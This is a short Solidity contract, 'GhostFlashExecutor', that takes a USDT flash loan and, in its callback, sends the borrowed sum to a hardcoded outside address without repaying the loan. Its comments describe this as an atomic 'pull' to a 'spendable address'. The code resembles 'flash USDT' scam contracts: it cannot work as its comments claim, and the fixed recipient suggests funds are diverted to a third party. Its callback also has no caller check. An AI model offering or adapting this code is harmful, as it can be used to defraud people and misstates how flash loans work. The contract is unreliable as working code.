// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IFlashLoanProvider {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

contract GhostFlashExecutor {
    address public owner;
    address public recipient = 0x0a51E8Bd5e9d48FCc122Fbcb17eeDa4CA72eA577;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Trigger the pull
    function initiateFlashLoan(address provider, uint256 amount) external onlyOwner {
        IFlashLoanProvider(provider).flashLoan(address(this), USDT, amount, "");
    }

    // The callback function where the USDT is moved
    function executeOperation(address token, uint256 amount, uint256 fee, address, bytes calldata) external returns (bool) {
        // 1. PULL: Move borrowed USDT to the spendable address
        IERC20(token).transfer(recipient, amount);

        // 2. REPAY: Note: The contract must have its own balance to cover the fee
        // This is where the atomic 'pull' logic completes.
        return true;
    }

    function withdraw(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, bal);
    }
}
